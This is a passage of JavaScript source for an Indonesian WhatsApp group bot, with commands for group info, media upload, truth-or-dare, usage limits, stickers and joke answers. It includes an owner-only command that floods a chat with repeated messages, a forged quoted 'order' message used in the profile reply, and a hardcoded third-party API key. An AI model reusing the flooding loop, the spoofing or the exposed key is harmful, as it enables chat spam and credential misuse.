        if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
        if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
        if (AntiVirtex) return setReply('Sudah Aktif')
          addDataId(from, command, DataId)
          setReply("Sukses mengaktifkan antivirtex!");
        } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
        if (!AntiVirtex) return setReply('Sudah Mati')
          removeDataId (command, from, DataId)
          setReply("Sukses mematikan antivirtex!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTIVIRTEX`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}antivirtex on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}antivirtex off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
        
        





    
    
    
    

  
  
									
									
									

									
    
    
             
    
    
    
case 'infogc':
case 'infogrup':
case 'infogroup':
case 'grupinfo':
case 'groupinfo':
if (!isGroup) return setReply('Hanya bisa di dalam group')
                 
try {
var pic = await xdev.getProfilePicture(from)
} catch {
var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
                
let ingfo = `*──❒ GROUP INFO ❒──*

*⦁ Nama :* ${groupName}
*⦁ Admin :* ${groupAdmins.length}
*⦁ Member :* ${groupMembers.length}
*⦁ Antivirtex :* ${AntiVirtex ? 'ON' : 'OFF'}
*⦁ Antilinkgc :* ${isAntilinkGc ? 'ON' : 'OFF'}
*⦁ Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}
*⦁ ID Group :* ${from}
*⦁ No click 🔎* ẉa.me/aryagans
*⦁ Descriipsi :* ↴ \n${groupMetadata.desc}`
xdev.sendMessage(from, ingfo, text, {
'contextInfo': {  
'text': '🔥',
'forwardingScore': 10000000,
'isForwarded': true,
'sendEphemeral': true,
'externalAdReply': {
'title':`${groupName}`,
'body': '',
'previewType': 'PHOTO',
'thumbnail': await getBuffer(pic),
'sourceUrl':`http://wa.me/${nomerOwner}`
}
}
})
break
           
                            
                          
           case 'getidgc':
           if(!isGroup) return setReply("Hanya bisa di group")
           setReply(`${from}`)
           break
    

    
       //------------------< Enable / Disable >-------------------
            case 'antibadword':
            case 'antitoxic':
                 if(isExtream) return
                if (!isGroup) return setReply('Hanya bisa di group')
                if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
                if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
                    if (Toxic) return setReply(`Udah aktif`)
                    addDataId(from, command, DataId)
					setReply(`antibadword grup aktif, kirim ${prefix}listbadword untuk melihat list badword`)
                } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
                    removeDataId (command, from, DataId)
                    setReply('antibadword grup nonaktif')
                } else if (!q) {
                      sendButMessage(from, `MODE ANTI BADWORD`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antibadword on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}antibadword off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
    
    
    
    
    
    
    
    
    
    

        
      

        
case 'tourl':
case 'imagetorul':
case 'imgtourl':
case 'audiotourl':
case 'videotourl':
case 'stickertourl': 
case 'stikertourl': 
case 'tolink':
if (isQuotedAudio) {
setReply(mess.wait)
bioij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delib = await xdev.downloadMediaMessage(bioij)
Okelor = await uploadFile1Day(delib)
teks=`*──❒ AUDIO TO URL ❒──*

Url : ${Okelor}`
setReply(teks)
 
} else if (isQuotedImage) {
											
setReply(mess.wait)
bioij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delib = await xdev.downloadMediaMessage(bioij)
qbc = await upload(delib)
teks=`*──❒ IMAGE TO URL ❒──*

Url : ${qbc}`
setReply(teks)
} else if (isQuotedVideo) {
setReply(mess.wait)
bioij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delib = await xdev.downloadMediaMessage(bioij)
ffff = await uploadFile1Day(delib)
teks=`*──❒ VIDEO TO URL ❒──*

Url : ${ffff}`
setReply(teks)
} else if (isQuotedSticker) {
													
setReply(mess.wait)
bioij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delib = await xdev.downloadMediaMessage(bioij)
													
vrr = await uploadFile1Day(delib)
teks=`*──❒ STICKER TO URL ❒──*

Url : ${vrr}`
setReply(teks)
}
break
											
											
											
											
											
											
											
											
        
        
        
        

        
        

					
					
					
					case 'truth':
					if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
					const trut = ['Pernah suka sama siapa aja? berapa lama?', 'Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)', 'apa ketakutan terbesar kamu?', 'pernah suka sama orang dan merasa orang itu suka sama kamu juga?', 'Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?', 'pernah gak nyuri uang nyokap atau bokap? Alesanya?', 'hal yang bikin seneng pas lu lagi sedih apa', 'pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?', 'pernah jadi selingkuhan orang?', 'hal yang paling ditakutin', 'siapa orang yang paling berpengaruh kepada kehidupanmu', 'hal membanggakan apa yang kamu dapatkan di tahun ini', 'siapa orang yang bisa membuatmu sange', 'siapa orang yang pernah buatmu sange', '(bgi yg muslim) pernah ga solat seharian?', 'Siapa yang paling mendekati tipe pasangan idealmu di sini', 'suka mabar(main bareng)sama siapa?', 'pernah nolak orang? alasannya kenapa?', 'Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget', 'pencapaian yang udah didapet apa aja ditahun ini?', 'kebiasaan terburuk lo pas di sekolah apa?']
					const ttrth = trut[Math.floor(Math.random() * trut.length)]
					setReply(`${ttrth}`) 
					break
			case 'dare':
			if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
					const dare = ['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu', 'telfon crush/pacar sekarang dan ss ke pemain', 'pap ke salah satu anggota grup', 'Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo', 'ss recent call whatsapp', 'drop emot 🤥 setiap ngetik di gc/pc selama 1 hari', 'kirim voice note bilang can i call u baby?', 'drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu', 'pake foto sule sampe 3 hari', 'ketik pake bahasa daerah 24 jam', 'ganti nama menjadi "gue anak lucinta luna" selama 5 jam', 'chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you', 'prank chat mantan dan bilang " i love u, pgn balikan', 'record voice baca surah al-kautsar', 'bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini', 'sebutkan tipe pacar mu!', 'snap/post foto pacar/crush', 'teriak gajelas lalu kirim pake vn kesini', 'pap mukamu lalu kirim ke salah satu temanmu', 'kirim fotomu dengan caption, aku anak pungut', 'teriak pake kata kasar sambil vn trus kirim kesini', 'teriak " anjimm gabutt anjimmm " di depan rumah mu', 'ganti nama jadi " BOWO " selama 24 jam', 'Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
					const der = dare[Math.floor(Math.random() * dare.length)]
					setReply(`${der}`)
					break
	     
//******************** 》Limit《 ********************\\


case 'limit':
case 'ceklimit': 
setReply(`*──❒ LIMIT ❒──*

Hai Beban ${pushname}
*Limit :* ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}
*Kamu Dapat Membeli Limit Dengan Cara Tag/Chat Owner 🙂*
`)
break

case 'giftlimit':
if (!isOwner) return onlyOwner()
if (!q)return setReply(`Example : ${prefix + command} @tag 10`)
lim = q.split(" ")[1]
const tag1 = `${q.split(" ")[0].replace("@",'')}`
giveLimit(tag1, lim, user)
setReply('*Berhasil Mengirim Limit...!!*')
break






case 'me': 
case 'profile':
case 'myprofile':
try {
ppimg = await xdev.getProfilePicture(`${sender.split('@')[0]}@c.us`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
stst = await xdev.getStatus(`${sender.split('@')[0]}@c.us`)
stst = stst.status == 401 ? '' : stst.status
let cekprm = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
hituser = gethitUser(senderNumber, user)
persenya =`${userPersen}`
nana =`${userExp}/${requiredExp}`
if(isOwner){
	 prmm = isPremium ? `Unlimited`:'Not Premium'
	} else {
      prmm = isPremium ? `${cekprm.days} Hari ${cekprm.hours} Jam ${cekprm.minutes} Menit ${cekprm.seconds} Detik`:'Not Premium'
 }
 
teks = `*──❒ USER PROFILE ❒──*

🆔 Nama : ${pushname} 
✅ Verified : ${userVerified}
📇 Status : ${isPremium ? 'Premium':'Free'}
📟 User Hit : ${hituser}
🤖 Status Bot : ${isOwner ? 'Owner':'User'}
🕔 Expired : ${prmm}
📉 Limit : ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}
📲 No : wa.me/${sender.split("@")[0]}
🧸 Bio : ${stst}
`


its = await getBuffer (ppimg)

butprofile = [{ buttonId: `y`, buttonText: { displayText: `ᴏᴋᴇ` }, type: 1 },{ buttonId: `okr`, buttonText: { displayText: `ᴛᴀɴᴋꜱ` }, type: 1 } ];         
buttonMessage = {
contentText: teks,
footerText: copyright,
buttons: butprofile,
headerType: 1,
}
xdev.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {quoted: { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : `${getBalance(senderNumber, user)}`, status: 1,surface : 2,message: `${pushname}\n${stst}`,orderTitle: `${stst}`,thumbnail: its, sellerJid: `0@s.whatsapp.net`}}}})
break
           
           
           
           
           
           
           

           

           
           
           
           
           
           
           
          
           
           
           
           

           
           
           
    
    
      
      
           
           
        
                 
              
                 
                

        



 
 
 

           
           
           
           
           
           
           
           case 'spam':
				if (!isOwner && !dev.key.fromMe) return setReply(mess.only.ownerB)
					if (!arg) return setReply(`Penggunaan ${prefix}spam teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return setReply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return setReply('Kebanyakan!')
				if (isNaN(argzi[1])) return setReply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					xdev.sendMessage(from, argzi[0], MessageType.text)
				}
				break
         
           
           
           
     
    

      
           
           
                    
                    
           
           
           
           
case 'kodebahasa':
let LANGUAGES = `*──❒ KODE BAHASA ❒──*

#KODE dan Bahasanya

⦁ sq: Albanian
⦁ ar: Arabic
⦁ hy: Armenian 
⦁ zh: Chinese 
⦁ en: English    
⦁ eo: Esperanto 
⦁ fi: Finnish 
⦁ fr: French
⦁ de: German 
⦁ id: Indonesian 
⦁ it: Italian
⦁ ja: Japanese
⦁ ko: Korean
⦁ ro: Romanian
⦁ ru: Russian
`
setReply(LANGUAGES)
break
           
           
case 'cekme':
case 'me':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
if (!isGroup) return reply(mess.only.group)
neme = args.join(" ")
bet = `${sender}`
const sifat =['Baek','Jutek','Ngeselin','Bobrok','Pemarah','Sopan','Beban','Sangean','Cringe','Pembohong']
const hoby =['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
const bukcin =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const arp =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cakep =['Iyaa cakep','Maaf Kak, Banyak² Perawatan Ya','Jelek ajg','Cakep banget😍','❌','✔️']
const wetak=['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
const baikk =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const bhuruk =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cerdhas =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const berhani =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const mengheikan =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const sipat = sifat[Math.floor(Math.random() * sifat.length)]
const biho = hoby[Math.floor(Math.random() * hoby.length)]
const bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
const senga = arp[Math.floor(Math.random() * arp.length)]
const chakep = cakep[Math.floor(Math.random() * cakep.length)]
const watak = wetak[Math.floor(Math.random() * wetak.length)]
const baik = baikk[Math.floor(Math.random() * baikk.length)]
const burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
const cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
const berani = berhani[Math.floor(Math.random() * berhani.length)]
const takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
try {
profil = await xdev.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
} catch {
profil = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
profile = `*──❒ MENGECEK BEBAN GRUP ❒──*

*⦁ Nomor Si Beban* => @${bet.split('@')[0]}

*⦁ Nama :* ${pushname}
*⦁ Sifat :* ${sipat}
*⦁ Bucin :* ${bhucin}%
*⦁ Cakep :* ${chakep}
*⦁ Watak :* ${watak}
*⦁ Hobby :* ${biho}
*⦁ Ketakutan :* ${takut}%
*⦁ Keberanian :* ${berani}%
*⦁ Kecerdasan :* ${cerdas}%
*⦁ Akhlak Baik :* ${baik}%
*⦁ Akhlak Buruk :* ${burug}%

*⦁ Awokawokawok 😎 .*
`
buff = await getBuffer(profil)
xdev.sendMessage(from, buff, image, {quoted: dev, caption: profile, contextInfo: forward})
break

           
           
           
           
           
           case 'translate': case 'tr':
									try {
										if (args.length < 1)return setReply(`Usage : #translate kode bahasa teks/reply pesan\nExample : #translate id why`)
										if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) {
											translate(`${body.slice(10+args[0].length+1)}`, args[0])
											.then((res) => { setReply(`${res}`) })
											} else {
												tolang = args[0]
												entah = dev.message.extendedTextMessage.contextInfo.quotedMessage.conversation
												translate(entah, tolang)
												.then((res) => { setReply(`${res}`) })
												}
											} catch (e) {
												setReply(`${e}`)
												}
											break
           
           


                      

case 'ppcp':
case 'ppcouple':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
anu = await fetchJson(`https://api.lolhuman.xyz/api/random/ppcouple?apikey=d16af494a6d7bd0fc1cf55a1`)
cowo = await getBuffer(anu.result.male)
cewe = await getBuffer(anu.result.female)
xdev.sendMessage(from, cowo, image, {quoted: dev, caption: '*Nih Versi Cowo Nya!!*' })
xdev.sendMessage(from, cewe, image, {quoted: dev, caption: '*Nih Versi Cewe Nya!!*' })
break
           
           
           
           
       
case 'loli':
case 'cosplay':
case 'husbu':
case 'wallml':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))
buttons = [{buttonId:`Ok`,buttonText:{displayText:'ᴛᴀɴᴋꜱ'},type:1}]
imageMsg = ( await xdev.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
buttonsMessage = {footerText:'*Done Kak!!*', imageMessage: imageMsg,
contentText:`🥰`,buttons,headerType:4}
prep = await xdev.prepareMessageFromContent(from,{buttonsMessage},{quoted: dev})
xdev.relayWAMessage(prep)
fs.unlinkSync(`./${sender}.jpeg`)
break  

           
           
           
           
           

              
       
             
           
           
case 'stickerpatrick':
case 'pat':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
  sendStickerUrl(from, pjr)
}
)
break

case 'stickergura':
case 'gawgura':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
sendStickerUrl(from, pjr)
}
)
break

case 'stickeramongus':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
random = Math.floor(Math.random() * 6) + 1
wkwk = await getBuffer(`https://api.lolhuman.xyz/api/sticker/amongus?apikey=d16af494a6d7bd0fc1cf55a1`)
xdev.sendMessage(from, wkwk, sticker, {quoted: dev})
break               

case 'stickerbucin':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
random = Math.floor(Math.random() * 6) + 1
wkwk = await getBuffer(`https://api.lolhuman.xyz/api/sticker/bucinstick?apikey=d16af494a6d7bd0fc1cf55a1`)
xdev.sendMessage(from, wkwk, sticker, {quoted: dev})
break
           
           
        
case 'attp':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
if (args.length < 1) freply(`*Teks Nya Mana Kak?\n*Contoh : ${prefix}attp aryagans*`)
anubang = await getBuffer(`https://api.lolhuman.xyz/api/attp2?apikey=d16af494a6d7bd0fc1cf55a1&text=${q}`)
xdev.sendMessage(from, anubang, sticker, { quoted: dev })
break

case 'ttp':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
if (args.length < 1) freply(`*Teks Nya Mana Kak?*\n*Contoh :${prefix}ttp aryagans*`)
anuu = await getBuffer(`https://api.lolhuman.xyz/api/ttp?apikey=d16af494a6d7bd0fc1cf55a1&text=${q}`)
xdev.sendMessage(from, anuu, sticker, {quoted: dev })
break





 

           
           
           
           
           
 
           
           

           case 'd':
				case 'del':
				case 'delete':
				if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) return setReply("Untuk menghapus reply pesan botnya")
				if(!isQuotedReply) return setReply("Reply pesan bot")
				premnih = dev.message.extendedTextMessage.contextInfo.participant
                
					xdev.deleteMessage(from, { id: dev.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					
					break
           
           
           
           
				
		
           
          
           
           
           
           
           
case 'jadian':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
if(!isGroup) return setReply("Ga mau ah, lu jelek")
jds = []
const jdii = groupMembers
const koss = groupMembers
const akuu = jdii[Math.floor(Math.random() * jdii.length)]
const diaa = koss[Math.floor(Math.random() * koss.length)]
teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]} ❤️ @${diaa.jid.split('@')[0]} `
jds.push(akuu.jid)
jds.push(diaa.jid)
mentions(teks, jds, true)
break
	

           
           
				

				

			

           
case 'memeindo2':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
data = fs.readFileSync('./lib/game/memeindo.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];        
buffer = await getBuffer(randKey.result)
xdev.sendMessage(from, buffer, image, {quoted : dev, caption : "*Done Kak!!*"})
break

case 'quotes':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
data = fs.readFileSync('./lib/game/quotes.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];        
quotes = randKey.quotes
xdev.sendMessage(from, quotes, text, {quoted : dev})
break
           
           
           
           
           case 'diem':
			     if (!isOwner) return onlyOwner()
			    if (!isGroup) return 
			if(!checkDataName("mute", from, DataId)) { createDataId("mute", DataId) }
                if (checkDataId ("mute", from, DataId) ) return setReply(`*aku udah diem nih*`)
                addDataId(from, "mute", DataId)
                setReply( `Baik kak 😥 `)
                break
                
                case 'udah':
      if (!isOwner) return onlyOwner()
			    if (!isGroup) return 
     
                removeDataId ("mute", from, DataId)
                setReply(`Oke kak 😁`)
            break
					
           
           
         
           
           
           
           case 'katailham':  
                       if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					const su = ilhamberkata[Math.floor(Math.random() * ilhamberkata.length)]
					xdev.sendMessage(from, ''+su+'\n\n\n*ilham nih senggol dong*', text, { quoted: dev })
					limitAdd(senderNumber, user)
					break
					
					case 'bucin':
		            if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					const sa = ngebucin[Math.floor(Math.random() * ngebucin.length)]
					xdev.sendMessage(from, ''+sa+'\n\n\n*Bucin doang pacaran kaga*', text, { quoted: dev })
					limitAdd(senderNumber, user)
					break
           
 case 'bisakah':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
bisakah = body.slice(1)
const bisa =['BISA','Tidak Bisa','Oh tentu saja bisa dong','Udah dari lahir dia bisa kaya gitu kak 😄','Oh tentu saja tidak bisa','Wuih bisa bisa','Ga mao jawab ah lu wibu','Tentu saja bisa eh tapi boong awokawok ','Engga engga dia ga bisa','Enggaklah','Aku ga mao jawbab 🙂','Rahasia dong','Ulangi Tod gua ga paham','Mana gua tau anjir']
const keh = bisa[Math.floor(Math.random() * bisa.length)]
xdev.sendMessage(from, 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh, text, { quoted: dev })
break

case 'kapankah':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
kapankah = body.slice(1)
const kapan =['Besok','Lusa','1 Hari Lagi','2 Hari Lagi','3 Hari Lagi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','7 Bulan Lagi','8 Bulan Lagi','9 Bulan Lagi','10 Bulan Lagi','11 Bulan Lagi','1 Tahun lagi','2 Tahun lagi','3 Tahun lag0i','4 Tahun lagi','5 Tahun lagi','6 Tahun lagi','7 Tahun lagi','8 Tahun lagi','9 Tahun lagi','10 Tahun lagi']
const koh = kapan[Math.floor(Math.random() * kapan.length)]
xdev.sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, text, { quoted: dev })
break
					
case 'apakah':
